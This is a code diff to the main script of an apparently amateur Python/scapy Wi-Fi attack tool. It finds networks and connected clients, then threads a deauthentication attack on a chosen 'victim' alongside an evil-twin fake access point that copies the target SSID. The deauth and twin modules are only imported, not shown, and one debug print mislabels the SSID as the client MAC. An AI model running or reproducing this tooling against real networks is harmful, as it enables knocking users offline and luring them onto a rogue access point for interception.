@@ -9,6 +9,7 @@ import deautenticate as DA
 import Twin_create as TC
 from scapy import all as sc
 import time
+from threading import Thread
 
 
 
@@ -16,7 +17,10 @@ import time
 AvialableWifiNetworks = []
 Clients = []
 ChosenWifiMA = ""
+ChosenWifiSSID = ""
 WifiAdapter = ""
+
+
 def PacketHendler(packet):
     #if packet end with 11 like 802.11
     if packet.haslayer(sc.Dot11):
@@ -37,11 +41,9 @@ def PacketHendler(packet):
 #  WifiAdapter = selected interface
 def WifiNetworksFinder():
     print("\nScanning for avialable wireless netwroks...\n")
-    start_time = time.time()
-    seconds = 10
     #  iface = the interfaces that we would like to sniff on
     # prn = allows us to pass a function that executes with each packet sniffed
-    sc.sniff(iface=WifiAdapter, prn=PacketHendler , timeout = 10)
+    sc.sniff(iface=WifiAdapter, prn=PacketHendler , timeout = 40)
 
     # printing the Available Wifi Networks withe their ssid(name) and their mac address
     print("\n\n\nThe Available Wifi Networks are:\n")
@@ -55,13 +57,16 @@ def WifiNetworksFinder():
                 break
         except:
             print("Unavialable choise! please enter a number from the list above.")
-    return AvialableWifiNetworks[int(wifi_network_choice)].addr2
+    ChosenWifiSSID = AvialableWifiNetworks[int(wifi_network_choice)].info
+    ChosenWifiMA = AvialableWifiNetworks[int(wifi_network_choice)].addr2
+    # ChosenWifiSSID = str[2:len(str)]
+    return [ChosenWifiMA , ChosenWifiSSID]
 
 
 def ClientsFinder():
-    print("\n Scanning for clients...\n")
+    print("\nScanning for clients...\n")
     sc.sniff(iface=WifiAdapter, prn=CLientsSniffing , timeout = 40)
-    print("\n\n\nThe Clients who connected to the chosen wifi are:\\n")
+    print("\n\n\nThe Clients who connected to the chosen wifi are:\n")
     for index, item in enumerate(Clients):
         print(f"{index} MAC Address : {item} ,")
     print("\n\n")
@@ -95,11 +100,37 @@ def CLientsSniffing(pkt):
 
 
 if __name__ == "__main__":
+
+    #finding wifi adapter
     WifiAdapter = WAF.WifiAdapterFinder()
+    #changing adapter to monitor mode
     WAF.MonitorMode(WifiAdapter)
-    ChosenWifiMA = WifiNetworksFinder()
-    chosenClient=ClientsFinder()
-    DA.deautenticate_user(WifiAdapter,ChosenWifiMA,chosenClient)
+    #scanning for wifi network to attack
+    wifi_details = WifiNetworksFinder()
+    ChosenWifiMA = wifi_details[0]
+    ChosenWifiSSID = wifi_details[1]
+    #finding a specific client of the chosen wifi network to attack
+    ChosenClient=ClientsFinder()
+
+
+    print("wifi adapter is : " , WifiAdapter)
+    print("chosen wifi mac address is : " , ChosenWifiMA)
+    print("chosen wifi ssid is : " , ChosenWifiSSID)
+    print("chosen client mac address is : " , ChosenWifiSSID)
+    #create thread that disconnect the victim from the chosen wifi 
+    Deauthenticate_thread = Thread(target=DA.deautenticate_user,args=[WifiAdapter,ChosenWifiMA,ChosenClient])
+
+    #create thread that create an fake wireless network (evil twin)
+    TwinNet_thread = Thread(target = TC.create_fake_access_point , args = [WifiAdapter , ChosenWifiMA , ChosenClient , ChosenWifiSSID])
+
+    Deauthenticate_thread.start()
+    TwinNet_thread.start()
+
+    TwinNet_thread.join()
+    Deauthenticate_thread.join()
+    # DA.deautenticate_user(WifiAdapter,ChosenWifiMA,chosenClient)
+    # TC.create_fake_access_point(WifiAdapter , ChosenWifiMA , ChosenClient , ChosenWifiSSID)
+    
 
 
 
